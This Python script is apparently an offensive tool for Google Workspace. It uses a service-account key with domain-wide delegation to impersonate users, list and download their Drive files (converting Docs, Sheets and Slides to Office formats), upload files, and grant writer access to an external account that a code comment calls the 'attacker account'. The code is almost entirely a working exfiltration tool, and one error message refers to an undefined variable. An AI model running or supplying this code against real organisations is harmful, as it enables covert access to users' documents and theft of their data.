#!/usr/bin/env python

import json
from google.oauth2 import service_account
from googleapiclient import discovery
from googleapiclient.http import MediaIoBaseDownload
from googleapiclient.http import MediaFileUpload
from pprint import pprint

SCOPES = ["https://www.googleapis.com/auth/drive"]

def get_gdrive_service(service_account_key, impersonate):

    service_creds = None
    with open(service_account_key, "r") as f:
        service_creds = json.load(f)

    # Setup the creds by assigning the specific GSuite scope
    credentials = service_account.Credentials.from_service_account_info(service_creds, scopes=SCOPES)

    # Perform delegation and retrieve credentials of the delegated user
    delegated_credentials = None
    if credentials:
        delegated_credentials = credentials.with_subject(impersonate)

    service = None
    if delegated_credentials:
        try:
            service = discovery.build("drive", "v3", credentials=delegated_credentials)
        except Exception:
            print("Error testing API access using delegated credentials " 'for "%s"', email)
    return service

def listFiles(service_account_key, impersonate):
    gdrive_service = get_gdrive_service(service_account_key, impersonate)

    # Get user's gdrive files: 
    results = gdrive_service.files().list(q="trashed=false",fields="files(name, mimeType)",).execute()

    if items := results.get('files', []):
        print("======================= Files and folders in Google Drive =======================")
        for item in items:
            print(f"Title: {item['name']}, Type: {item['mimeType']}")

    else:
        print("No files or folders found.")
            
def listFolders(service_account_key, impersonate):
    gdrive_service = get_gdrive_service(service_account_key, impersonate)
    # List all folders in Google Drive
    results = gdrive_service.files().list(q="mimeType='application/vnd.google-apps.folder'",fields="files(id, name)").execute()

    if folders := results.get('files', []):
        print('======================= Identified folders in Google Drive =======================')
        for folder in folders:
            folder_id = folder["id"]
            folder_name = folder["name"]

            # Query for files within the specified folder
            folder_query = f"'{folder_id}' in parents"
            folder_files = gdrive_service.files().list(q=folder_query, fields="files(id, name, mimeType)").execute()

            files = folder_files.get('files', [])
            num_files = len(folder_files.get('files', []))
            print("\n"+f'{folder_name} ({folder_id}) - {num_files} Files:')
            for file in files:
                file_name = file["name"]
                file_mime_type = file["mimeType"]
                print(f'  - {file_name} (MIME Type: {file_mime_type})')

    else:
        print('----- No folders found. -----')

def file_id_by_name(service_account_key, impersonate, filename):
    # Query for the file by name
    file_query = f"name = '{filename}'"
    gdrive_service = get_gdrive_service(service_account_key, impersonate)
    file_list = gdrive_service.files().list(q=file_query, fields="files(id)").execute()

    files = file_list.get('files', [])
    if files:
        return files[0]["id"]
    else:
        return None

def folder_id_by_name(service_account_key, impersonate, foldername):
    try:
        folder_query = f"name='{foldername}' and mimeType='application/vnd.google-apps.folder'"
        gdrive_service = get_gdrive_service(service_account_key, impersonate)
        results = gdrive_service.files().list(q=folder_query, fields="files(id)").execute()
        return files[0]['id'] if (files := results.get('files', [])) else None
    except Exception as e:
        print(f"An error occurred while getting folder ID: {e}")
        return None

def downloadFiles(service_account_key, impersonate, filename):
    gdrive_service = get_gdrive_service(service_account_key, impersonate)
    file_id = file_id_by_name(service_account_key, impersonate, filename)
    try:
        file = gdrive_service.files().get(fileId=file_id).execute()
        print(file)
        file_name = file.get('name')

            # Check if the file is a google document (Doc, Sheets, Slides) and export in equivalent Office format Docx, xlsx and ppts
        if 'vnd.google-apps' in file['mimeType']:
            if 'application/vnd.google-apps.spreadsheet' in file['mimeType']:
                export_mimeType = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'  # XLSX for Google Sheets
                print("+++ Converting Google Sheets to XLSX format")
                file_name = f'{file_id}_{filename}.xlsx'
            elif 'application/vnd.google-apps.document' in file['mimeType']:
                export_mimeType = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'  # DOCX for Google Docs
                print("+++ Converting Google Doc to DOCX format")
                file_name = f'{file_id}_{filename}.docx'
            elif 'application/vnd.google-apps.presentation' in file['mimeType']:
                export_mimeType = 'application/vnd.openxmlformats-officedocument.presentationml.presentation'  # PPTX for Google Slides
                print("+++ Converting Google Slides to PPTX format")
                file_name = f'{file_id}_{filename}.pptx'
            elif 'application/vnd.google-apps.script'  in file['mimeType']:
                print("+++ Google Apps Script files - Retrieving script content using Files: Get method - Function no implemented")
            else:
                print("Export format not available for this Google file type.")
                return

            request = gdrive_service.files().export_media(fileId=file_id, mimeType=export_mimeType)
        else:
            # This is a binary file
            request = gdrive_service.files().get_media(fileId=file_id)

        fh = open(file_name, "wb")
        downloader = MediaIoBaseDownload(fh, request)

        done = False
        while not done:
            status, done = downloader.next_chunk()
            print(f"+++ Download {int(status.progress() * 100)}%")

        print(f"====> Downloaded file (fileID_filename): '{file_name}'\n")

    except Exception as e:
            print(f"An error occurred: {e}")
    
def uploadFiles(service_account_key, impersonate, filepath, filename, foldername=None):
    gdrive_service = get_gdrive_service(service_account_key, impersonate)
    try:
        media_body = MediaFileUpload(filepath, resumable=True)
        file_metadata = {'name': filename}

        if foldername:
            if parent_folder_id := folder_id_by_name(
                service_account_key, impersonate, foldername
            ):
                file_metadata['parents'] = [parent_folder_id]

        uploaded_file = gdrive_service.files().create(body=file_metadata, media_body=media_body).execute()

        print(f"File '{filename}' uploaded successfully with ID: {uploaded_file['id']}")

    except Exception as e:
        print(f"An error occurred: {e}")

def modifyPermissions(service_account_key, impersonate, externalaccount, filename): 
    file_id = file_id_by_name(service_account_key, impersonate, filename)
    gdrive_service = get_gdrive_service(service_account_key, impersonate)
    try:
        # Role set to writer to provide write access to the document: https://developers.google.com/drive/api/guides/ref-roles
        permission = {'type': 'user', 'role': 'writer', 'emailAddress': externalaccount}
        
        # Set to True to notify the external user (attacker account most of the time)
        permission = gdrive_service.permissions().create(fileId=file_id, body=permission, sendNotificationEmail=True).execute()
        
        print(f"+++ Full access granted to {externalaccount}. File: {filename}")
        print(f"+++ Permission ID: {permission['id']}\n")
        
    except Exception as e:
        print(f"--- An error occurred during permissions sharing: {e}")
    

